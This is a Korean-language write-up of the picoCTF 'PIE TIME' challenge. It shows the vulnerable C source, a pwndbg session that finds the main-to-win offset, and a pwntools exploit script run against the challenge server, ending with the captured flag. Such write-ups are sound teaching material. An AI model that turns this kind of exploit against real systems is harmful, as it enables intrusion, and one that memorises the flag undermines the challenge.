# [PIE TIME](https://play.picoctf.org/practice/challenge/490?category=6&page=1)
<br />

**Description:**
> Can you try to get the flag? Beware we have PIE!
<br />

**Source Code:**
```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void segfault_handler() {
  printf("Segfault Occurred, incorrect address.\n");
  exit(0);
}

int win() {
  FILE *fptr;
  char c;

  printf("You won!\n");
  // Open file
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL)
  {
      printf("Cannot open file.\n");
      exit(0);
  }

  // Read contents from file
  c = fgetc(fptr);
  while (c != EOF)
  {
      printf ("%c", c);
      c = fgetc(fptr);
  }

  printf("\n");
  fclose(fptr);
}

int main() {
  signal(SIGSEGV, segfault_handler);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  printf("Address of main: %p\n", &main);

  unsigned long val;
  printf("Enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);
  printf("Your input: %lx\n", val);

  void (*foo)(void) = (void (*)())val;
  foo();
}
```
<br />

**Binary Protections:**
```yaml
vuln: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0072413e1b5a0613219f45518ded05fc685b680a, for GNU/Linux 3.2.0, not stripped

$ pwn checksec vuln
[*] '/home/kali/CTF/vuln'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```
<br />
<br />

바이너리를 실행하면 `main`의 주소를 출력하고, 점프할 주소를 입력 받습니다. `win`으로 점프하면 문제가 풀리지만, 바이너리에는 `PIE`가 적용되어 있어서 `win`의 주소를 특정하기 어렵습니다. 그러나 함수의 오프셋은 영향을 받지 않으므로, 디버깅을 통해 `win`의 오프셋을 구하면 문제를 쉽게 해결할 수 있을 것입니다.
```bash
pwndbg> p/a 0x55555555533d
$1 = 0x55555555533d <main>
pwndbg> p win
$2 = (<text variable, no debug info> *) 0x5555555552a7 <win>
pwndbg> p/x 0x55555555533d - 0x5555555552a7
$3 = 0x96
```
`main`과 `win`의 오프셋은 `0x96` 입니다.

```bash
$ ./vuln
Address of main: 0x564f85f0633d
Enter the address to jump to, ex => 0x12345: 0x564f85f062a7
Your input: 564f85f062a7
You won!
Cannot open file.
```
바이너리를 실행하여 제공되는 `main`의 주소에서 `0x96`만큼 뺀 주소로 점프하면 문제가 풀이됩니다.

```python
from pwn import *

context.log_level = "error"

#p = process("./vuln")
p = remote("rescued-float.picoctf.net", 59222)

p.recvuntil(b"0x")

MAIN = int(p.recv(12), 16)
WIN = MAIN - 0x96
log.info(f"WIN: {WIN:#x}")

p.sendlineafter(b"0x12345: ", hex(WIN).encode())
p.interactive()
```
```bash
$ python3 test.py
Your input: 563387db42a7
You won!
picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_fec8b8c5}

$
```
